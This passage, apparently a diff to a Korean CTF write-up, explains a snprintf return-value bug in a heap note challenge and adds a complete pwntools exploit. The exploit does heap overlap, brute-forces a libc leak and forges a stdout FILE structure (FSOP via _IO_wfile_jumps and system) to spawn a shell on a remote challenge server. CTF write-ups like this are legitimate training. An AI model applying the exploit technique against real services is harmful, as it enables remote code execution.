@@ -154,4 +154,128 @@ getline(&lineptr, &n, stdin);
 s = (char *)malloc(0x60uLL);
 v3 = snprintf(s, 0x5FuLL, "%s", lineptr);
 ```
-`v3`는 0x5f가 아니라, 0x5f라는 제한이 없었을 때 써지는 바이트 수를 반환받는다. 따라서 우리는 힙 영역에서 원하는 바이트를 \x00으로 만들 수 있다. 힙 영역에 힙 주소가 있으므로 이를 변조해서 size 조작하고, free -> unsorted bin -> libc leak 한다. 그 다음 힙 주소 변조 -> 
+`v3`는 0x5f가 아니라, 0x5f라는 제한이 없었을 때 써지는 바이트 수를 반환받는다. 따라서 우리는 힙 영역에서 원하는 바이트를 \x00으로 만들 수 있다. 힙 영역에 힙 주소가 있으므로 이를 변조해서 size 조작하고, free -> unsorted bin -> libc leak 한다. 그 다음 힙 주소 변조 -> 참조 청크 주소 변조 -> FSOP한다.
+
+### ex.py
+
+```python
+from pwn import *
+from tqdm import *
+from Crypto.Util.number import long_to_bytes
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
+parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
+args = parser.parse_args()
+
+gdb_cmds = [
+    'set follow-fork-mode parent',
+    'b *exit',
+    'c'
+]
+
+binary = './prob'
+ 
+context.binary = binary
+context.arch = 'amd64'
+# context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+if args.remote:
+    p = remote("3.39.86.84", 1337)
+else:
+    p = process(binary)
+    if args.gdb:
+        gdb.attach(p, '\n'.join(gdb_cmds))
+l = ELF("./libc.so.6")
+
+def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
+                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
+                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
+                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
+                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
+                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
+    
+    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
+    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
+    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
+    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
+    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
+    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
+    FSOP += p64(__pad5) + p32(_mode)
+    if _unused2 == b"":
+        FSOP += b"\x00" * 0x14
+    else:
+        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
+    
+    FSOP += p64(vtable)
+    FSOP += more_append
+    return FSOP
+
+def create(sz : int, ctt : bytes):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b': ', str(sz).encode())
+    p.sendlineafter(b': ', ctt)
+
+def read(ctt : bytes):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b': ', ctt)
+
+def edit(idx : int, ctt : bytes):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b': ', str(idx).encode())
+    p.sendafter(b': ', ctt)
+
+def delete(idx : int):
+    p.sendlineafter(b'> ', b'4')
+    p.sendlineafter(b': ', str(idx).encode())
+
+for i in range(20):
+    create(0x5f, b'a' * 0x5f)
+
+delete(14)
+create(0x5f, b'b' * (0x70 - 1))
+
+delete(0)
+create(0x5f, b'b' * (0x70 - 1))
+edit(1, b'd' * 0x38 + p16(0x70 + 0x90 * 16 + 1) + b'\x00')
+delete(0)
+for i in range(14):
+    create(0x5f, b'a' * 0x5f)
+
+for i in trange(0, 0x1000):
+    num = (i << 12) + 0xb20
+    pay = long_to_bytes(num)[::-1]
+    read(pay)
+    res1 = p.recvline()
+    if b'Too' in res1 :
+        continue
+    if b'Too' not in res1:
+        res1 = p.recvn(2)
+        if b'No' in res1 :
+            continue
+    break
+
+p.recvuntil(b'] ')
+l.address = u64(p.recvn(6).ljust(8, b'\x00')) - 0x203b20
+print(hex(l.address))
+print(hex(l.sym['_IO_2_1_stdout_']))
+
+fake_fsop_struct = l.sym['_IO_2_1_stdout_']
+stdout_lock = l.address + 0x205710
+FSOP = FSOP_struct(
+	flags=u64(b"\x01\x01\x01\x01;sh\x00"),
+	lock=stdout_lock,
+	_wide_data=fake_fsop_struct - 0x10,
+	_markers=l.symbols["system"],
+	_unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
+	vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
+	_mode=0xFFFFFFFF,
+)
+edit(15, p64(fake_fsop_struct) + p64(0x101))
+edit(14, FSOP)
+
+# p.sendlineafter(b'> ', b'5')
+p.interactive()
+```
